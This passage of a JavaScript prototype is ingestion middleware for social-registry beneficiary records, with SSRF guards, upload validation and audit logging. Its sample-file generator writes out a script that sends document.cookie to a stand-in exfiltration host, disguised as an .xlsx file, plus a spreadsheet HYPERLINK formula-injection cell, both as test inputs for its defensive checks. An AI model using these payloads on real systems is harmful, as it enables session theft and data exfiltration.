    const byName = Object.fromEntries(schema.fields.map((f) => [f.name, f]));
    return SOURCE_SCHEMAS.CCT_TEMPLATE_V1.map((h) => {
      const f = byName[h];
      const t = (f.type || '').toLowerCase();
      if (f.codeList) return m(h, 'codelist', h, f.codeList);
      if (t.startsWith('boolean')) return m(h, 'boolean', h);
      if (t.startsWith('integer')) return m(h, 'integer', h);
      if (t.startsWith('decimal')) return m(h, 'decimal', h);
      if (h === 'given_name' || h === 'family_name') return m(h, 'titlecase', h);
      if (h === 'phone_number') return m(h, 'phone_e164', h);
      return m(h, 'trim', h);
    });
  }

  function seedSources(now) {
    const base = { createdBy: 'seed (prototype)', createdAt: now - 30 * DAY, updatedBy: 'seed (prototype)', updatedAt: now - 30 * DAY, removed: false, lastSuccessAt: null, lastFailureAt: null };
    return [
      { ...base, id: 'SRC-NSR-NASSCO', name: 'NASSCO National Social Registry', type: 'National Registry', org: 'NASSCO', description: 'National Social Registry household and member records (NSR form 4.5 layout).', env: 'Testing', modes: ['API', 'IMPORT'], connection: 'API', baseUrl: 'https://nsr-api.mock.invalid', endpoint: '/v1/households/members', method: 'GET', authRef: 'vault://databridge/sources/nassco/oauth-client', pagination: 'cursor, page size 10', incremental: 'updated_since watermark', watermark: now - 1 * DAY, importFormat: 'CSV / XLSX (NSR form export)', layout: 'NASSCO_FORM_45', schemaVersion: 'nsr-form-4.5 / v1', frequency: 'Daily 02:00 WAT', enabled: true, health: 'HEALTHY' },
      { ...base, id: 'SRC-STATE-JOSH', name: 'Josh State Registry', type: 'State Registry', org: 'State Social Protection Office (illustrative)', description: 'State-level register. Contract not yet supplied; layout below is an assumed example.', env: 'Testing', modes: ['API'], connection: 'API', baseUrl: 'https://josh-registry.mock.invalid', endpoint: '/api/v2/beneficiaries', method: 'POST', authRef: 'vault://databridge/sources/josh/api-key', pagination: 'offset/limit 10', incremental: 'lastUpdated > watermark', watermark: now - 2 * DAY, importFormat: '—', layout: 'JOSH_V2', schemaVersion: 'josh-v2 / v3', frequency: 'Every 6 hours', enabled: true, health: 'HEALTHY' },
      { ...base, id: 'SRC-LGA-UPLOAD', name: 'LGA Beneficiary List Upload', type: 'File Upload', org: 'LGA Desk Officers', description: 'Manually prepared lists using the published CCT template (headers = canonical names).', env: 'Testing', modes: ['IMPORT'], connection: 'IMPORT', baseUrl: '', endpoint: '', method: '', authRef: '—', pagination: '—', incremental: '—', watermark: null, importFormat: 'CCT template v1 (.csv / .xlsx)', layout: 'CCT_TEMPLATE_V1', schemaVersion: 'cct-nsr-template / v1', frequency: 'Manual', enabled: true, health: 'HEALTHY' },
      { ...base, id: 'SRC-LEGACY-PILOT', name: 'Legacy CCT Pilot List', type: 'Other', org: 'Programme archive', description: 'Retired pilot list kept for history. Disabled.', env: 'Testing', modes: ['IMPORT'], connection: 'IMPORT', baseUrl: '', endpoint: '', method: '', authRef: '—', pagination: '—', incremental: '—', watermark: null, importFormat: 'CCT template v1 (.csv)', layout: 'CCT_TEMPLATE_V1', schemaVersion: 'cct-nsr-template / v1', frequency: 'Manual', enabled: false, health: 'DISABLED' },
    ];
  }

  function seedDestinations(now) {
    return [
      { id: 'MASTER_SR1', role: 'PRIMARY', name: 'NSR master register (socialregistrydb)', endpoint: 'POST /partner/ingest_data?data_model=nsr (mock)', authRef: 'vault://databridge/destinations/sr1/mtls-client', enabled: true, health: 'HEALTHY', deliveryPolicy: 'Idempotent upsert by idempotency key; batch size 10', retry: { maxAttempts: 5, baseMs: 2000, factor: 2, capMs: 60000, jitter: 'full' }, lastDeliveryAt: null },
      { id: 'MASTER_SR2', role: 'REPLICA', name: 'NSR read replica', endpoint: 'GET /registry/records/{internal_record_id} (mock read probe)', authRef: 'vault://databridge/destinations/sr2/read-only', enabled: true, health: 'HEALTHY', deliveryPolicy: 'Read-only. Populated by SR1 replication, never written by middleware', retry: { maxAttempts: 3, baseMs: 30000, factor: 2, capMs: 300000, jitter: 'full' }, lagThresholdMs: 60000, lastSyncAt: null },
    ];
  }

  // ---------------------------------------------------------------------------
  // Engine
  // ---------------------------------------------------------------------------

  class AuthzError extends Error {}

  function createEngine(schema, opts) {
    opts = opts || {};
    const rng = mulberry32(opts.seed || 20261027);
    const fieldsByName = Object.fromEntries(schema.fields.map((f) => [f.name, f]));
    const state = {
      now: opts.now || Date.now(),
      role: 'PLATFORM_ADMIN',
      user: 'demo.user@cct.example',
      sources: [],
      destinations: [],
      mappings: {},
      runs: [],
      errors: [],
      audit: [],
      blockedAttempts: [],
      master: { byKey: new Map(), bySourceKey: new Map(), byNin: new Map(), records: new Map() },
      replica: new Map(),
      seq: { run: 0, err: 0, aud: 0, master: 0, ingest: 0, batch: 0, dry: 0, hh: 100, id: 1000 },
      counters: { duplicatesPrevented: 0 },
    };
    state.sources = seedSources(state.now);
    state.destinations = seedDestinations(state.now);
    for (const s of state.sources) {
      const rows = s.layout === 'CCT_TEMPLATE_V1' ? templateMapping(schema) : clone(MAPPINGS[s.layout]);
      state.mappings[s.id] = { sourceId: s.id, version: 1, transformVersion: 'tx-lib-1.0', publishedAt: state.now - 30 * DAY, publishedBy: 'seed (prototype)', rows, history: [{ version: 1, at: state.now - 30 * DAY, by: 'seed (prototype)', note: 'Initial mapping' }] };
    }

    // ---- RBAC + audit --------------------------------------------------------
    const can = (perm) => ROLES[state.role].perms.includes(perm);
    function audit(action, target, outcome, detail) {
      const id = `AUD-${pad(++state.seq.aud, 6)}`;
      state.audit.push({ id, at: state.now, actor: state.user, role: state.role, action, target, outcome: outcome || 'SUCCESS', detail: detail || '', traceId: 'tr-' + sha256(id + state.now).slice(0, 12) });
      return id;
    }
    function authz(perm, target) {
      if (!can(perm)) {
        audit('AUTHZ_DENIED', target || '-', 'DENIED', `Missing permission ${perm}`);
        throw new AuthzError(`Your role (${ROLES[state.role].label}) does not have permission: ${perm}`);
      }
    }

    // ---- errors --------------------------------------------------------------
    function raise(code, ctx) {
      const t = ERROR_TAXONOMY[code];
      const id = `ERR-${pad(++state.seq.err, 5)}`;
      const e = {
        id, code, desc: t.desc, stage: ctx.stage || t.stage, severity: t.severity, retryable: t.retryable, action: t.action,
        at: state.now, sourceId: ctx.sourceId || null, runId: ctx.runId || null, recordId: ctx.recordId || null,
        detail: ctx.detail || '', field: ctx.field || null, retryCount: 0, traceId: ctx.traceId || 'tr-' + sha256(id).slice(0, 12),
        resolution: 'OPEN', resolvedAt: null, resolutionNote: '',
      };
      state.errors.push(e);
      if (ctx.record) ctx.record.errorIds.push(id);
      return e;
    }
    function resolveErrors(record, codes, note) {
      for (const e of state.errors) {
        if (e.recordId === record.id && codes.includes(e.code) && e.resolution !== 'RESOLVED') {
          e.resolution = 'RESOLVED'; e.resolvedAt = state.now; e.resolutionNote = note;
        }
      }
    }

    // ---- source management ---------------------------------------------------
    const getSource = (id) => state.sources.find((s) => s.id === id);
    function addSource(cfg) {
      authz('source.edit', cfg.id);
      const err = validateSourceConfig(cfg, true);
      if (err) throw new Error(err);
      const s = { createdBy: state.user, createdAt: state.now, updatedBy: state.user, updatedAt: state.now, removed: false, lastSuccessAt: null, lastFailureAt: null, watermark: null, health: cfg.enabled ? 'UNTESTED' : 'DISABLED', ...cfg };
      state.sources.push(s);
      const rows = s.layout === 'CCT_TEMPLATE_V1' ? templateMapping(schema) : clone(MAPPINGS[s.layout] || []);
      state.mappings[s.id] = { sourceId: s.id, version: 1, transformVersion: 'tx-lib-1.0', publishedAt: state.now, publishedBy: state.user, rows, history: [{ version: 1, at: state.now, by: state.user, note: `Initial mapping from layout ${s.layout}` }] };
      audit('SOURCE_CREATED', s.id, 'SUCCESS', `${s.name} (${s.connection})`);
      return s;
    }
    function validateSourceConfig(cfg, isNew) {
      if (!cfg.id || !/^[A-Z0-9-]{3,40}$/.test(cfg.id)) return 'Source ID must be 3–40 characters: A–Z, 0–9 and hyphen.';
      if (isNew && getSource(cfg.id)) return `Source ID ${cfg.id} already exists.`;
      if (!cfg.name || cfg.name.trim().length < 3) return 'Source name is required.';
      if (cfg.connection === 'API') {
        const ssrf = checkOutboundUrl(cfg.baseUrl || '');
        if (ssrf) return ssrf;
      }
      if (cfg.authRef && cfg.authRef !== '—' && !/^vault:\/\/[a-z0-9/_-]+$/.test(cfg.authRef)) return 'Credentials must be a vault reference (vault://…). Never paste a secret value here.';
      return null;
    }
    // SSRF guard for configurable outbound URLs: https only, no IP literals, no internal hosts, allow-listed suffixes.
    function checkOutboundUrl(url) {
      let u;
      try { u = new URL(url); } catch (_) { return 'Base URL is not a valid URL.'; }
      if (u.protocol !== 'https:') return 'Only https:// source URLs are allowed (TLS 1.2+).';
      if (u.username || u.password) return 'URLs must not embed credentials.';
      const host = u.hostname.toLowerCase();
      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host) || host.includes(':') || host === 'localhost' || host.endsWith('.local') || host.endsWith('.internal') || host.endsWith('.svc') || host.endsWith('.cluster.local')) {
        return 'Blocked by SSRF policy: IP literals and internal hostnames are not allowed.';
      }
      const allow = ['.mock.invalid', '.gov.ng', '.nassco.gov.ng'];
      if (!allow.some((a) => host.endsWith(a))) return `Host ${host} is not on the egress allow-list (${allow.join(', ')}).`;
      return null;
    }
    function updateSource(id, patch) {
      authz('source.edit', id);
      const s = getSource(id);
      if (!s) throw new Error('Unknown source');
      const next = { ...s, ...patch, id: s.id };
      const err = validateSourceConfig(next, false);
      if (err) throw new Error(err);
      Object.assign(s, patch, { updatedBy: state.user, updatedAt: state.now });
      audit('SOURCE_UPDATED', id, 'SUCCESS', Object.keys(patch).join(', '));
      return s;
    }
    function setSourceEnabled(id, enabled) {
      authz('source.toggle', id);
      const s = getSource(id);
      s.enabled = enabled; s.health = enabled ? 'UNTESTED' : 'DISABLED'; s.updatedAt = state.now; s.updatedBy = state.user;
      audit(enabled ? 'SOURCE_ENABLED' : 'SOURCE_DISABLED', id);
      return s;
    }
    function sourceDependencies(id) {
      const runs = state.runs.filter((r) => r.sourceId === id);
      const active = runs.filter((r) => ['QUEUED', 'RUNNING'].includes(runStatus(r)));
      const masterRecords = [...state.master.records.values()].filter((x) => x.sourceId === id).length;
      return { runs: runs.length, activeRuns: active.length, masterRecords };
    }
    function removeSource(id) {
      authz('source.edit', id);
      const s = getSource(id);
      const dep = sourceDependencies(id);
      if (dep.activeRuns) throw new Error(`Cannot remove: ${dep.activeRuns} run(s) still in progress.`);
      s.removed = true; s.enabled = false; s.health = 'REMOVED'; s.updatedAt = state.now; s.updatedBy = state.user;
      audit('SOURCE_REMOVED', id, 'SUCCESS', `Soft delete. Kept ${dep.runs} runs, ${dep.masterRecords} delivered records and all audit events.`);
      return dep;
    }
    function testConnection(id, sim) {
      authz('source.test', id);
      const s = getSource(id);
      const steps = [];
      const t0 = state.now;
      if (!s.enabled) {
        steps.push(['Source enabled', false, 'Source is disabled']);
      } else if (s.connection === 'IMPORT') {
        steps.push(['Template registered', true, s.schemaVersion]);
        steps.push(['Quarantine bucket writable (simulated)', true, 'object store zone: raw/quarantine']);
      } else {
        const url = checkOutboundUrl(s.baseUrl);
        steps.push(['Egress / SSRF policy', !url, url || 'host on allow-list']);
        steps.push(['DNS + TLS 1.3 handshake (simulated)', true, 'certificate chain valid (mock)']);
        const auth = !(sim && sim.authFail);
        steps.push(['Fetch credential from vault (simulated)', true, s.authRef + ' → short-lived token issued']);
        steps.push(['Authenticate with source', auth, auth ? 'HTTP 200, token scope registry.read' : 'HTTP 401 invalid_client']);
        if (auth) steps.push(['Probe schema (1 record)', true, `matches ${s.schemaVersion}`]);
      }
      const ok = steps.every((x) => x[1]);
      s.health = !s.enabled ? 'DISABLED' : ok ? 'HEALTHY' : 'FAILING';
      audit('SOURCE_CONNECTION_TESTED', id, ok ? 'SUCCESS' : 'FAILURE');
      return { ok, steps, latencyMs: 180 + Math.floor(rng() * 220), at: t0, mock: true };
    }

    // ---- mapping -------------------------------------------------------------
    function sourceFieldsFor(sourceId) {
      return SOURCE_SCHEMAS[getSource(sourceId).layout] || [];
    }
    function validateMapping(sourceId, rows) {
      rows = rows || state.mappings[sourceId].rows;
      const srcFields = new Set(sourceFieldsFor(sourceId));
      const errors = [], warnings = [];
      const targets = {};
      rows.forEach((r, i) => {
        const f = fieldsByName[r.target];
        if (!f) errors.push({ row: i, msg: `Target '${r.target}' is not a canonical field` });
        else if (f.fill !== 'source') errors.push({ row: i, msg: `${r.target} is ${f.fill}-filled and cannot be mapped from a source` });
        if (!TRANSFORMS[r.op]) errors.push({ row: i, msg: `Unknown transform '${r.op}'` });
        else if (TRANSFORMS[r.op].arg && isBlank(r.arg)) errors.push({ row: i, msg: `${TRANSFORMS[r.op].label} needs: ${TRANSFORMS[r.op].arg}` });
        if (r.op === 'codelist' && r.arg && !schema.codeLists[r.arg]) errors.push({ row: i, msg: `Code list '${r.arg}' does not exist` });
        if (r.op !== 'constant' && !r.sources.length) errors.push({ row: i, msg: 'No source field selected' });
        r.sources.forEach((sf) => { if (!srcFields.has(sf)) errors.push({ row: i, msg: `Source field '${sf}' is not in the registered source schema` }); });
        if (r.target) {
          if (targets[r.target] !== undefined) errors.push({ row: i, msg: `${r.target} is mapped twice (rows ${targets[r.target] + 1} and ${i + 1})` });
          targets[r.target] = i;
        }
      });
      const mapped = new Set(rows.map((r) => r.target));
      const sourceFilled = schema.fields.filter((f) => f.fill === 'source');
      const requiredMissing = sourceFilled.filter((f) => f.mandatory === 'Yes' && !mapped.has(f.name)).map((f) => f.name);
      const conditionalMissing = sourceFilled.filter((f) => f.mandatory === 'Conditional' && !mapped.has(f.name)).map((f) => f.name);
      requiredMissing.forEach((n) => errors.push({ row: null, msg: `Required field ${n} is not mapped` }));
      conditionalMissing.forEach((n) => warnings.push({ row: null, msg: `Conditionally required field ${n} is not mapped` }));
      const optionalUnmapped = sourceFilled.filter((f) => f.mandatory === 'No' && !mapped.has(f.name)).length;
      return {
        ok: errors.length === 0, errors, warnings, requiredMissing, conditionalMissing, optionalUnmapped,
        mappedCount: mapped.size, sourceFilledCount: sourceFilled.length,
        requiredTotal: sourceFilled.filter((f) => f.mandatory === 'Yes').length,
        requiredMapped: sourceFilled.filter((f) => f.mandatory === 'Yes' && mapped.has(f.name)).length,
        systemCount: schema.fields.filter((f) => f.fill === 'system').length,
        derivedCount: schema.fields.filter((f) => f.fill === 'derived').length,
      };
    }
    function publishMapping(sourceId, rows, note) {
      authz('mapping.edit', sourceId);
      const v = validateMapping(sourceId, rows);
      if (!v.ok) throw new Error(`Mapping has ${v.errors.length} error(s); fix them before publishing.`);
      const mp = state.mappings[sourceId];
      mp.version += 1; mp.rows = clone(rows); mp.publishedAt = state.now; mp.publishedBy = state.user;
      mp.history.push({ version: mp.version, at: state.now, by: state.user, note: note || 'Updated mapping' });
      audit('MAPPING_PUBLISHED', `${sourceId} v${mp.version}`, 'SUCCESS', note || '');
      return mp;
    }
    function applyMapping(rows, payload) {
      const out = {}, issues = [];
      for (const r of rows) {
        try {
          const val = applyTransform(r.op, r.arg, r.sources.map((s) => payload[s]), schema.codeLists);
          if (val !== null && val !== undefined && val !== '') out[r.target] = val;
        } catch (e) {
          issues.push({ code: 'TRANSFORMATION_FAILED', field: r.target, severity: 'ERROR', message: `${r.target} ← ${r.sources.join('+') || 'constant'}: ${e.message}` });
        }
      }
      return { out, issues };
    }
    function testMapping(sourceId, rows, sampleIndex) {
      const s = getSource(sourceId);
      const people = makeHouseholds(mulberry32(77 + (sampleIndex || 0)), 3, { serialPrefix: 'SYN-HH', serialBase: 9000, idBase: 9000, now: state.now });
      const payload = RENDERERS[s.layout](people[(sampleIndex || 0) % people.length]);
      const res = applyMapping(rows || state.mappings[sourceId].rows, payload);
      const val = validateCanonical(res.out);
      return { payload, canonical: res.out, issues: res.issues.concat(val) };
    }

    // ---- canonical validation -----------------------------------------------
    function validateCanonical(c, skipFields) {
      const issues = [];
      const skip = new Set(skipFields || []);
      const err = (code, field, message, severity) => issues.push({ code, field, message, severity: severity || 'ERROR' });
      for (const f of schema.fields) {
        if (f.fill !== 'source') continue;
        const v = c[f.name];
        if (skip.has(f.name)) continue;
        if (f.mandatory === 'Yes' && isBlank(v)) { err('REQUIRED_FIELD_MISSING', f.name, `${f.name} is required`); continue; }
        if (isBlank(v)) continue;
        if (typeof v === 'string' && looksLikeFormula(v)) { err('FIELD_VALIDATION_FAILED', f.name, `${f.name} starts with a formula character; value neutralised and rejected`); continue; }
        if (f.regex && !new RegExp(f.regex).test(String(v))) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} fails format rule ${f.regex}`);
        if (f.range && (Number(v) < f.range[0] || Number(v) > f.range[1])) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} outside range ${f.range[0]}..${f.range[1]}`);
        if (f.codeList && schema.codeLists[f.codeList] && !schema.codeLists[f.codeList].some((x) => x.code === String(v))) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} not in code list ${f.codeList}`);
        if ((f.type || '').startsWith('date')) {
          const d = Date.parse(v);
          if (isNaN(d)) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} is not a valid date`);
          else if (d > state.now) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} is in the future`);
          else if (state.now - d > 120 * 365.25 * DAY) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} implies age over 120`);
        }
        if (typeof v === 'string' && v.length > 200) err('FIELD_VALIDATION_FAILED', f.name, `${f.name} longer than 200 characters`);
      }
      // Conditional rules (proposed; NASSCO validation scripts pending, open decision 6)
      if (c.has_valid_nin === true && isBlank(c.nin_type)) err('REQUIRED_FIELD_MISSING', 'nin_type', 'nin_type is required when has_valid_nin = Yes');
      if (c.has_valid_nin === true && c.nin_type === '1' && isBlank(c.nin)) err('REQUIRED_FIELD_MISSING', 'nin', 'nin is required when ID type is NIN');
      if (!isBlank(c.account_number) && (isBlank(c.bank_name) || isBlank(c.account_name))) err('REQUIRED_FIELD_MISSING', 'bank_name', 'bank_name and account_name are required with account_number');
      if (!isBlank(c.latitude) && (c.latitude < 4 || c.latitude > 14)) err('FIELD_VALIDATION_FAILED', 'latitude', 'latitude outside Nigeria bounds 4.0..14.0', 'WARN');
      if (!isBlank(c.longitude) && (c.longitude < 2.6 || c.longitude > 14.7)) err('FIELD_VALIDATION_FAILED', 'longitude', 'longitude outside Nigeria bounds 2.6..14.7', 'WARN');
      if (c.consent_to_share_data === false) err('FIELD_VALIDATION_FAILED', 'consent_to_share_data', 'Consent = No: record delivered with sharing restricted; supervisor notified', 'WARN');
      return issues;
    }

    // ---- file upload security ------------------------------------------------
    const UPLOAD_LIMIT = 5 * 1024 * 1024;
    function validateUpload(meta) {
      // meta: { name, size, mime, headBytes: number[] (first 8 bytes) }
      const checks = [];
      const add = (name, ok, detail) => checks.push({ name, ok, detail });
      const rawName = String(meta.name || '');
      const safeName = rawName.replace(/^.*[\\/]/, '').replace(/[^A-Za-z0-9._-]/g, '_').slice(0, 120);
      add('File name sanitised', true, rawName === safeName ? safeName : `stored as ${safeName} (path or unsafe characters removed)`);
      const ext = (safeName.match(/\.([A-Za-z0-9]+)$/) || [, ''])[1].toLowerCase();
      add('Extension allow-list (.csv, .xlsx)', ['csv', 'xlsx'].includes(ext), ext ? `.${ext}` + (['xlsm', 'xls', 'xlsb'].includes(ext) ? ' (macro-capable or legacy formats are refused)' : '') : 'no extension');
      add(`Size ≤ ${UPLOAD_LIMIT / 1024 / 1024} MB`, meta.size > 0 && meta.size <= UPLOAD_LIMIT, `${(meta.size / 1024).toFixed(1)} KB`);
      const hb = meta.headBytes || [];
      const isZip = hb[0] === 0x50 && hb[1] === 0x4b && hb[2] === 0x03 && hb[3] === 0x04;
      const isOle = hb[0] === 0xd0 && hb[1] === 0xcf;
      let sigOk, sigDetail;
      if (ext === 'xlsx') { sigOk = isZip; sigDetail = isZip ? 'ZIP container (PK\\x03\\x04)' : 'content is not an Office Open XML container'; }
      else if (ext === 'csv') { sigOk = !isZip && !isOle && !hb.includes(0) && !/^<(!doctype|html|script)/i.test(String.fromCharCode(...hb.filter((b) => b > 31 && b < 127)).slice(0, 8)); sigDetail = sigOk ? 'plain text' : 'binary or markup content in a .csv'; }
      else { sigOk = false; sigDetail = 'not checked: extension refused'; }
      add('File signature matches extension', sigOk, sigDetail);
      add('MIME type', !meta.mime || /csv|text\/plain|spreadsheetml|octet-stream|ms-excel/.test(meta.mime), meta.mime || 'not supplied by browser');
      add('Macros and formulas', true, 'never executed: cells are read as values only');
      const ok = checks.every((c) => c.ok);
      return { ok, checks, safeName, ext };
    }
    function checkHeaders(sourceId, headers) {
      const expected = sourceFieldsFor(sourceId);
      const got = headers.map((h) => String(h).trim());
      const missing = expected.filter((h) => !got.includes(h));
      const unexpected = got.filter((h) => !expected.includes(h));
      const mappedSources = new Set(state.mappings[sourceId].rows.flatMap((r) => r.sources));
      const blocking = missing.filter((h) => mappedSources.has(h));
      return { ok: blocking.length === 0, missing, unexpected, blocking, fingerprint: sha256(got.join('|')).slice(0, 16), expectedFingerprint: sha256(expected.join('|')).slice(0, 16) };
    }

    // Built-in sample files so the demo works without the user's own files.
    function sampleFile(kind, sourceId) {
      const s = getSource(sourceId || 'SRC-LGA-UPLOAD');
      const r2 = mulberry32(kind.length * 991 + state.seq.run + 7);
      if (kind === 'malicious') {
        const text = '<html><script>fetch("https://exfil.invalid/?d="+document.cookie)</script></html>';
        return { name: 'beneficiaries_Q3.xlsx', mime: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', text, size: text.length, headBytes: [...text.slice(0, 8)].map((c) => c.charCodeAt(0)) };
      }
      const people = makeHouseholds(r2, kind === 'duplicates' ? 15 : 20, { serialPrefix: 'SYN-HH', serialBase: (state.seq.hh += 40), idBase: (state.seq.id += 60), now: state.now });
      const rows = people.map((p) => RENDERERS[s.layout](p));
      if (kind === 'duplicates') {
        rows.push({ ...rows[2] }, { ...rows[5] }, { ...rows[9] });
        const nameKey = s.layout === 'CCT_TEMPLATE_V1' ? 'family_name' : 'surname';
        rows[7][nameKey] = '=HYPERLINK("https://exfil.invalid","Click")';
      }
      if (kind === 'drift') rows.forEach((r) => { if (s.layout === 'CCT_TEMPLATE_V1') { r.dob = r.birth_date; delete r.birth_date; } });
      const headers = Object.keys(rows[0]);
      const text = toCsvRaw([headers].concat(rows.map((r) => headers.map((h) => r[h] === undefined ? '' : r[h]))));
      const name = { good: 'lga_list_oct.csv', duplicates: 'lga_list_with_duplicates.csv', drift: 'lga_list_new_layout.csv' }[kind] || 'sample.csv';
      return { name, mime: 'text/csv', text, size: text.length, headBytes: [...text.slice(0, 8)].map((c) => c.charCodeAt(0)) };
    }
    // Writes cells as-is (used only to *produce* sample input files, which must keep their hostile content).
    function toCsvRaw(rows) {
      return rows.map((r) => r.map((v) => { const s = String(v); return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s; }).join(',')).join('\n') + '\n';
    }

    // ---- runs ----------------------------------------------------------------
    const API_STAGES = ['PREFLIGHT', 'AUTHENTICATE', 'EXTRACT', 'SCHEMA_CHECK', 'MAP_TRANSFORM', 'VALIDATE', 'DEDUPLICATE', 'DELIVER_PRIMARY', 'CONFIRM_COMMIT', 'REPLICA_SYNC', 'RECONCILE'];
    const FILE_STAGES = ['PREFLIGHT', 'UPLOAD_SCAN', 'PARSE', 'SCHEMA_CHECK', 'MAP_TRANSFORM', 'VALIDATE', 'DEDUPLICATE', 'DELIVER_PRIMARY', 'CONFIRM_COMMIT', 'REPLICA_SYNC', 'RECONCILE'];
    const STAGE_LABELS = { PREFLIGHT: 'Pre-flight checks', AUTHENTICATE: 'Authenticate', EXTRACT: 'Extract (paged)', UPLOAD_SCAN: 'Upload scan / quarantine', PARSE: 'Parse file', SCHEMA_CHECK: 'Schema check', MAP_TRANSFORM: 'Map + transform', VALIDATE: 'Validate', DEDUPLICATE: 'De-duplicate + match', DELIVER_PRIMARY: 'Deliver to MASTER_SR1', CONFIRM_COMMIT: 'Confirm SR1 commit', REPLICA_SYNC: 'Verify MASTER_SR2', RECONCILE: 'Reconcile' };

    function startRun(sourceId, o) {
      o = o || {};
      authz('run.start', sourceId);
      const s = getSource(sourceId);
      if (!s || s.removed) throw new Error('Unknown source');
      if (!s.enabled) {
        const e = raise('SOURCE_DISABLED', { sourceId, detail: `Start requested by ${state.user} (${ROLES[state.role].label}); refused before any data was read.` });
        const a = audit('RUN_START_BLOCKED', sourceId, 'DENIED', 'Source is disabled');
        state.blockedAttempts.push({ at: state.now, sourceId, errorId: e.id, auditId: a });
        return { blocked: true, reason: 'Source is disabled. Enable it before starting ingestion.', errorId: e.id };
      }
      const mode = o.mode || s.connection;
      if (!s.modes.includes(mode)) throw new Error(`${s.name} does not support ${mode} mode`);
      const n = ++state.seq.run;
      const id = `RUN-${dayKey(state.now).replace(/-/g, '')}-${pad(n, 3)}`;
      const sim = o.sim || {};
      const mp = state.mappings[sourceId];
      let rows = clone(mp.rows);
      if (sim.mappingBreak) rows = rows.filter((r) => r.target !== sim.mappingBreak);
      const run = {
        id, sourceId, sourceName: s.name, mode, scenarioId: o.scenarioId || null, triggeredBy: `${state.user} (${ROLES[state.role].label})`,
        createdAt: state.now, startedAt: null, endedAt: null, traceId: 'tr-' + sha256(id).slice(0, 16), sim,
        mappingVersion: sim.mappingBreak ? `${mp.version}-draft` : mp.version, mappingRows: rows, transformVersion: mp.transformVersion,
        stages: (mode === 'API' ? API_STAGES : FILE_STAGES).map((k) => ({ key: k, label: STAGE_LABELS[k], status: 'PENDING', startedAt: null, endedAt: null, inCount: null, outCount: null, failCount: null, note: '' })),
        stageIdx: 0, fatal: null, blocked: false, records: [], batches: [], events: [], apiStats: { pages: 0, requests: 0, retries: 0, throttled: 0, timeouts: 0 },
        file: o.file || null, dryRun: !!o.dryRun, approvedBy: o.approvedBy || null, dryRunRef: o.dryRunRef || null,
        reconciliation: null, auditIds: [],
      };
      if (!o.dryRun) {
        state.runs.push(run);
        run.auditIds.push(audit('RUN_STARTED', id, 'SUCCESS', `${s.name} · ${mode}${o.scenarioId ? ' · scenario ' + o.scenarioId : ''}`));
      }
      return run;
    }

    const getRun = (id) => state.runs.find((r) => r.id === id);
    const tick = (ms) => { state.now += ms; };
    const ev = (run, msg, level) => run.events.push({ at: state.now, msg, level: level || 'info' });

    function stepRun(runOrId) {
      const run = typeof runOrId === 'string' ? getRun(runOrId) : runOrId;
      if (!run || run.fatal || run.blocked || run.stageIdx >= run.stages.length) return run;
      const st = run.stages[run.stageIdx];
      if (!run.startedAt) run.startedAt = state.now;
      st.status = 'RUNNING'; st.startedAt = state.now;
      try {
        STAGE_FN[st.key](run, st);
        if (st.status === 'RUNNING') st.status = 'DONE';
      } catch (e) {
        st.status = 'FAILED'; st.note = e.message;
        run.fatal = run.fatal || { stage: st.key, message: e.message };
      }
      tick(150 + Math.floor(rng() * 400));
      st.endedAt = state.now;
      run.stageIdx++;
      if (run.fatal || run.blocked) {
        for (let i = run.stageIdx; i < run.stages.length; i++) run.stages[i].status = 'SKIPPED';
        run.stageIdx = run.stages.length;
      }
      if (run.stageIdx >= run.stages.length) {
        run.endedAt = state.now;
        const src = getSource(run.sourceId);
        if (!run.dryRun) {
          if (run.fatal) src.lastFailureAt = state.now;
          else { src.lastSuccessAt = state.now; if (run.mode === 'API') src.watermark = state.now; }
          state.destinations[0].lastDeliveryAt = state.now;
        }
      }
      return run;
    }

    function fail(run, code, detail, stage) {
      const e = run.dryRun ? null : raise(code, { sourceId: run.sourceId, runId: run.id, detail, stage, traceId: run.traceId });
      ev(run, `${code}: ${detail}`, 'error');
      throw new Error(`${code}: ${detail}` + (e ? ` (${e.id})` : ''));
    }

    function generateRecords(run, count) {
      const s = getSource(run.sourceId);
      const r2 = mulberry32((run.sim.seed || 0) + state.seq.run * 131 + count);
      const people = makeHouseholds(r2, count, { serialPrefix: s.id === 'SRC-STATE-JOSH' ? 'JSH-HH' : 'NSR-HH', serialBase: (state.seq.hh += 50), idBase: (state.seq.id += count + 5), now: state.now });
      const sim = run.sim;
      if (sim.crossSource) {
        // Re-use NINs already delivered to the master from *another* source.
        const foreign = [...state.master.records.values()].filter((x) => x.sourceId !== run.sourceId && x.nin);
        for (let i = 0; i < Math.min(sim.crossSource, foreign.length); i++) {
          people[i * 2].nin = foreign[i].nin; people[i * 2].has_nin = true;
          people[i * 2].given = foreign[i].given || people[i * 2].given;
        }
      }
      const payloads = people.map((p) => RENDERERS[s.layout](p));
      let k = 3;
      for (let i = 0; i < (sim.missing || 0); i++) FAULTS.missing[s.layout](payloads[(k += 5) % payloads.length]);
      for (let i = 0; i < (sim.invalid || 0); i++) FAULTS.invalid[i % FAULTS.invalid.length][s.layout](payloads[(k += 3) % payloads.length]);
      return payloads.map((p, i) => ({ payload: p, updatedAt: people[i].updatedAt }));
    }

    function newRecord(run, idx, payload, updatedAt) {
      const s = getSource(run.sourceId);
      const sourceKey = `${run.sourceId}:${SOURCE_KEY_FIELD[s.layout](payload)}`;
      const sourceVersion = run.mode === 'API' ? `v${1 + (idx % 3)}` : `${run.file ? run.file.checksum.slice(0, 8) : 'file'}#${idx + 1}`;
      const sourceRecordId = run.mode === 'API' ? `${s.id.split('-').pop()}-${sha256(sourceKey).slice(0, 10)}` : `${run.file ? run.file.safeName : 'file'}#row${idx + 2}`;
      return {
        id: `${run.id}-R${pad(idx + 1, 3)}`, runId: run.id, sourceId: run.sourceId, seq: idx + 1,
        sourceRecordId, sourceVersion, sourceUpdatedAt: updatedAt || null, sourceKey,
        idemKey: sha256(`${sourceKey}|${sourceVersion}|${JSON.stringify(payload)}`).slice(0, 32),
        traceId: `${run.traceId}/${idx + 1}`, batchId: null, raw: payload, canonical: null,
